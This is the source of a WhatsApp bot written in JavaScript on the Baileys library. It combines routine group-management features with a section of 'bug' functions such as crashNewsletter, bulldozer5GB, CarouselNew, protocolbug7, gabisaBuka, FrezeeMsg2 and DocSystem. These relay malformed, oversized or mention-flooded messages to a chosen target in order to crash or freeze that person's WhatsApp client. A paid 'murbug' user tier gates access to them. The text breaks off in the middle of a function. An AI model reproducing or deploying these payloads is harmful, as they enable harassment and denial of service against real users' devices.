/*

##CREATED BY DIKATOKI##

Contact me
- t.me/dikatoki111 
- wa.me/6285708112935

Note: Ambil fitur gpp asal taruh tto di sc kalian

##COPYRIGHT DIKATOKI 2024-2025##

*/

require('./settings/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path");
const os = require('os');
const crypto = require('crypto');
const api = require('btch-downloader');
const ytdl = require('@vreden/youtube_scraper');
const ffmpeg = require('fluent-ffmpeg');
const { mega } = require('megajs');
const { tiktokDl } = require('./lib/tiktok');
const Websocket = require("ws");
const { Downloader } = require("@tobyg74/tiktok-api-dl");
const { runtime } = require('./lib/myfunc')
const { color } = require('./lib/color')
const { SnackVideo } = require('./lib/snackvideo')
const { Client } = require('ssh2');
const { jadibot, stopjadibot, listjadibot } = require('./clone')
const { reSize } = require('./database/function.js')

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');

const {
    default:
    baileys,
    getContentType, 
    generateWAMessageFromContent
   } = require("@whiskeysockets/baileys");

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
: m.key.participant || m.key.remoteJid;
         const quoted = m.quoted ? m.quoted : m       
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const isCmd = body.startsWith(prefix)
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const isMedia = /image|video|sticker|audio/.test(mime)
const isMediaa = /image|video/.test(mime)
const botNumber = await client.decodeJid(client.user.id)	
const pantek = ["https://files.catbox.moe/bungcj.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://files.catbox.moe/w32wj2.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://files.catbox.moe/hl0bwy.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://files.catbox.moe/xbmbcz.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://files.catbox.moe/2odfvo.m4a"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://files.catbox.moe/qyautv.mp3"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && budy.includes("viewOnceMessage")
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmin = isGroup ? groupAdmins.includes(botNumber) : false
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmin = isGroup ? groupAdmins.includes(sender) : false
const idGroups = ["${global.groupseller}@g.us"] //ganti pake idgc grup resellermu
const isPrivate = from.endsWith('@s.whatsapp.net')
const groupseller = idGroups.includes(m.chat)         
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}
let run = runtime(process.uptime())
 //scrape      
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
           } = require('./start/lib/myfunction');                
        const { remini } = require('./start/lib/function/remini');
        const menugmbr = fs.readFileSync(`./image/menu.jpg`)
const panelgmbr = fs.readFileSync(`./image/panel.jpg`)
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const { TelegraPh } = require("./lib/upload.js");
const { pinterest, resize } = require('./database/function.js')
const { chatGpt, ytMp4, ytMp3 } = require('./database/screaper.js');
const bugres = '*_OTW👿_*'
        const { fquoted } = require('./start/lib/fquoted')
        
///timek
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
              // Read Database
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const users = JSON.parse(fs.readFileSync("./database/pengguna.json"))
const prem = JSON.parse(fs.readFileSync("./database/premium.json"))
const bugg = JSON.parse(fs.readFileSync("./database/murbug.json"))
const seler = JSON.parse(fs.readFileSync("./database/resel.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const wlcm = JSON.parse(fs.readFileSync('./database/welcome.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))


// Cek Database
const isContacts = contacts.includes(sender)
const isUsers = users.includes(sender)
const isSeler = 
seler.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
const isMurbug = bugg.includes(sender) || isOwner
const isWelcome = wlcm.includes(m.chat) ? true : false
const isAntilink = antilink.includes(m.chat) ? true : false  

  
        //Log pesan
const idConsole = isGroup ? m.chat : m.sender; // Menggunakan ID grup jika di grup, dan ID nomor jika private chat
const timeConsole = moment.tz('Asia/Jakarta').format('HH:mm');
    
if (isGroup && !isCmd) {
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
                chalk.bgHex("#ff00ff").black(
                   `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${sender}`
                )
            );
            
            if (!isGroup && !isCmd) {
                        console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
                console.log(
                    chalk.bgHex("#ff00ff").black(
                        `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
}

//Funct banchat
const banchatFile = './database/banchat.json';
if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(banchatFile)) fs.writeFileSync(banchatFile, '[]');
let banchat = JSON.parse(fs.readFileSync(banchatFile));
if (banchat.includes(m.chat) && !['banchat', 'unbanchat', 'listbanchat'].includes(command)) {
  return;
}
//Status
if (!client.public) {
if (!m.key.fromMe) return
} 
// antilink
  if (!isAntilink) {
  if (!isAdmins && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await client.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await client.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./client.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await client.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}
  }
//anti Promosi
if (global.antipromosi && !isAdmin) {
    const messageContent = m.budy ? m.budy.toLowerCase() : ''; 
      const promosiPola = [
    /(jual|promo|diskon|harga|order|ready|sedia|sewa|open)\s+(.*)?/i, 
    /(menerima|melayani|menyediakan|beli|kami menyediakan)\s+(.*)?/i, 
    /(\btransaksi\b|\bpembayaran\b|\bnokos\b|\bdomain\b|\bpanel\b)/i, 
    /(open\s+(order|jasa|sewa))/i 
  ];   
    if (promosiPola.some(pattern => pattern.test(messageContent))) {  
      await client.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant || m.participant
        }
      });
    }
  }
        
//autotyping
if (global.autoTyping) {
if (command) {
client.sendPresenceUpdate('composing', from)
}
}    
//owner mode
if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
return client.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./image/owneroff.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: `https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`, sourceUrl: `https://youtube.com`, previewType: "PHOTO"}}}, {quoted: null})
}}
//autobio
 if (global.autoBio) {
    let time = (new Date() - run);
    let bio = `Im ${namabot} || ⏰ Runtime ${runtime(process.uptime())} || 🎨 Create By Dikatoki`;    
    await client.updateProfileStatus(bio).catch(err => console.log(err));
    //autoBio.status = new Date() * 1;
}
// Auto Read Nya
 if (global.autoread) {
    client.readMessages([m.key]);
    
        //menghapus statusMention di Group
        if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
            await client.deleteMessage(m.chat, m.key);
        }
        
        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
       
//Funct reminder
const reminders = [];
function parseDuration(input) {
  const match = input.match(/^(\d+)(s|m|h)$/i);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  let ms = 0;
  if (unit === 's') ms = value * 1000;
  if (unit === 'm') ms = value * 60 * 1000;
  if (unit === 'h') ms = value * 60 * 60 * 1000;
  return ms;
}
function setReminder({ sender, reason, duration, name, reply }) {
  const endTime = Date.now() + duration;
  const timeFormatted = moment(endTime).tz('Asia/Jakarta').format('DD/MM, HH.mm');
  reply(`✅ Pengingat telah diterima.\n\n` +
    `– bot akan mengingatkanmu sesuai format yang kamu minta.\n` +
    `– ⏰ waktu : ${duration / 60000}m\n` +
    `– 📍 untuk : ${reason}`);
  setTimeout(() => {
    reply(`⏰ *KRING!! KRINGG!! KRINGGG!!!*\n\n` +
      `– haii @${sender.split("@")[0]}, sudah waktunya *${reason}*`, { mentions: [sender] });
  }, duration);
  reminders.push({ sender, reason, endTime, timeFormatted });
}


// Loading
async function loading() {
    let emotLoad = ["🔎", "🕛", "👿", "✅️"]; // 
    let index = 0;
    let intervalId = setInterval(async () => {
        if (index < emotLoad.length) {         
            await client.sendMessage(from, { react: { text: emotLoad[index], key: m.key } });
            index++; 
        } else {
            clearInterval(intervalId);
        }
    }, 1000); 
}
async function loadingerror () {
let emotLoaderr = ["❌"]
 await client.sendMessage(from, { react: { text: emotLoaderr, key: m.key } })}

function monospace(string) {
return '```' + string + '```'
}

//Func bug whangsaff
async function crashNewsletter(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: target });

  await client.relayMessage(target, msg.message, { 
    participant: { jid: target },
    messageId: msg.key.id 
  });
}
function generateLargeString(sizeInBytes) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < sizeInBytes; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function bulldozer5GB(jid) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: 999999,
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Date.now() % 2147483647,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: ["0@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: {
            low: -10000000,
            high: 999,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  for (let i = 0; i < 600; i++) {
    await client.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
    });
  }
}
async function CarouselNew(target) {
  let haxxn = 10;

  for (let i = 0; i < haxxn; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        "body": {
          "text": "\u0000\u0000\u0000\u0000\u0000"
        },
        "footer": {
          "text": ""
        },
        "header": {
          "title": 'ϟ\u0000\u0000\u0000\u0000',
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "\u0000".repeat(55555)
            },
            "footer": {
              "text": "( 🐉 ) King dikatoki Is Here ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await client.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}
async function protocolbug7(target) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "client"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await client.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await client.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute"
        },
        content: undefined
      }]
    });
  }
}
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function selios(target) {
client.relayMessage(
target,
{
  extendedTextMessage: {
    text: "𓆩".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: "5521992999999@s.whatsapp.net", 
      quotedMessage: {
        conversation: "Xarousel" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
	async function gabisaBuka(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await client.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }	    
async function FrezeeMsg2(target) {
            let virtex = "𝙭-bug";
            let memekz = Date.now();

            await client.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "Nope-bang𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭" + "ꦾ".repeat(100000) + "\0000".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Oi bang" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
  async function DocSystem(target) {
            let virtex = "Whatsapp bro";

            client.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "P-BANG" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
